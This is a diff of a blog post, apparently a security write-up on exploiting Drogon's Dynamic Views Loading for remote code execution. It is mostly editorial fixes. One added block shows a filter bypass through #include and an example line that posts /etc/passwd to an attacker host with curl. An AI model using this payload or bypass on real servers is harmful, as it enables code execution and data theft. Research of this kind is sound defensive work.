@@ -66,7 +66,7 @@ app().registerHandler(
 
 After starting the server, we can run `curl 127.0.0.1:8080/hello/Picard` and observe the following HTML:
 
-```html {data-label=127.0.0.1:8080/hello/Picard}
+```html
 <!DOCTYPE html>
 <html>
 <body>
@@ -109,9 +109,9 @@ But it's possible to load compiled code at runtime through [shared objects](http
 1. The user writes a .csp file to the dynamic view path. The rest is up to Drogon.
 2. Drogon detects the new/modified .csp files.
 3. Drogon translates the .csp to a regular C++ .h and .cc file, using the `drogon_ctl` command-line tool.
-   - The .cc is compiled with the `-shared` flag in order to generate a shared object.
-4. The .so is loaded with `dlopen`, after previous versions are unloaded with `dlclose`.^[`dlopen` seems to only be available [on Unix-like machines](https://github.com/drogonframework/drogon/blob/637046189653ea22e6c4b13d7f47023170fa01b1/CMakeLists.txt#L320).]
-5. The new/updated view can now be used in application code.
+4. The .cc is compiled into a shared object (.so) using the `-shared` flag.
+5. The .so is loaded with `dlopen`, after previous versions are unloaded with `dlclose`.^[`dlopen` seems to only be available [on Unix-like machines](https://github.com/drogonframework/drogon/blob/637046189653ea22e6c4b13d7f47023170fa01b1/CMakeLists.txt#L320).]
+6. The new/updated view can now be used in application code.
 
 All of this happens in [SharedLibManager.cc](https://github.com/drogonframework/drogon/blob/637046189653ea22e6c4b13d7f47023170fa01b1/lib/src/SharedLibManager.cc). Feel free to take a gander.
 
@@ -217,7 +217,7 @@ Suppose an attacker can write any CSP content in the dynamic views path. In the 
 %>
 ```
 
-To trigger this RCE, the application code needs to render the view with `HttpResponse::newHttpViewResponse("Example.csp")`.
+To trigger this RCE, the application code needs to render the view with `HttpResponse::newHttpViewResponse("Example.csp")`{language=cpp}.
 
 The following diagram shows where code execution occurs along the pipeline. We'll update the diagram as we explore other vectors.
 
@@ -367,11 +367,14 @@ Handy Reference: [Using Inline Assembly in C/C++](https://www.codeproject.com/Ar
 Filters applied to a set of file extensions can be easily bypassed by uploading a file with an unfiltered extension, then `#include`-ing it in the CSP. All `#include` really does is copy-paste the included file's content, which then gets compiled as C/C++ code.
 
 - Example.csp - with stringent checks on denied words.
-    ```csp
+    ```csp {data-label=Example.csp}
     <%inc #include "safe.txt" %>
     ```
 
 - safe.txt - other C++ code which gets a free pass, possibly using a technique above.
+    ```cpp {data-label=safe.txt}
+    system("curl http://attacker.site --data @/etc/passwd");
+    ```
 
 This allows us to bypass situations where, say, .csp files are strictly checked, but certain extensions are not checked at all.
 
@@ -542,8 +545,8 @@ Do I expect the RCE issues to be fixed? Considering the purpose of DVLs... proba
 
 ## Conclusion
 
-Although Dynamic Views Loading (DVL) seems appealing for implementing features such as user-generated content or dynamically adding plugins, DVL is a dangerous liability if left in the open. In this post, we've demonstrated multiple ways to exploit DVL, given file-write privileges. DVL is ill-suited for production-use should only be used for its intended purpose — local testing in development environments.
+Although Dynamic Views Loading (DVL) seems appealing for implementing features such as user-generated content or dynamically adding plugins, DVL is a dangerous liability if left in the open. In this post, we've demonstrated multiple ways to exploit DVL, given file-write privileges. DVL is ill-suited for production-use and should only be used for its intended purpose — local testing in development environments.
 
 {% image "https://www.discoverhongkong.com/content/dam/dhk/gohk/2023/dragon-s-back/poi-4-960x720-a.jpg", "jw-80", "Dragon's Back in Hong Kong Island. Photo credit: Hong Kong Tourism Board." %}
 
-<sup>Nice View: *Dragon's Back* Hiking Trail in Hong Kong Island.</sup>{.caption}
+<sup>Nice View: the *Dragon's Back* Hiking Trail in Hong Kong Island.</sup>{.caption}
